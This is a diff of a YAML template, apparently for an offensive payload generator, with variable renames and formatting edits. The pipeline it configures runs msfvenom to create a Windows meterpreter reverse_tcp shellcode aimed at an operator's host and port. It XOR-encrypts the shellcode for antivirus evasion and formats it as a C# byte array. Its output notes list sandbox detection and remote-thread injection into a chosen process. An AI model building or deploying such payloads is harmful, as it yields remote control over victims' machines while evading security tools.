@@ -55,9 +55,9 @@ parameters:
   
   - name: "xor_key"
     type: "hex"
-    description: "XOR encryption key (single byte)"
+    description: "XOR encryption key (single byte, e.g., 'fa')"
     required: false
-    default: "fa"
+    default: fa
   
   - name: "output_file"
     type: "string"
@@ -76,24 +76,26 @@ preprocessing:
   - type: "command"
     name: "generate_shellcode"
     command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
-    output_var: "shellcode"
+    output_var: "raw_shellcode"
   
   # Step 2: XOR encrypt the shellcode
   - type: "script"
     name: "xor_encryption"
     script: "xor_encrypt.py"
     args:
-      data: "{{ shellcode }}"
+      data: "{{ raw_shellcode }}"
       key: "{{ xor_key }}"
-    output_var: "encrypted"
+    output_var: "xor_result"
   
   # Step 3: Format encrypted shellcode as C# byte array
   - type: "script"
-    name: "format_encrypted_payload"
+    name: "format_payload"
     script: "format_csharp.py"
     args:
-      data: "{{ encrypted.encrypted }}"
-    output_var: "formatted_shellcode"
+      data: "{{ xor_result.encrypted }}"
+      var_name: "buf"
+      bytes_per_line: 15
+    output_var: "csharp_payload"
 
 output:
   type: "template"
@@ -166,7 +168,7 @@ output:
     
     ## Notes:
     
-    - Encrypted with XOR key {{ xor_key }} for basic AV evasion
+    - Encrypted with XOR key 0x{{ xor_key }} for basic AV evasion
     - Includes NUMA-based sandbox detection
     - Auto-selects target: {{ elevated_target }} (elevated) or {{ default_target }} (normal)
     - Creates remote thread in target process
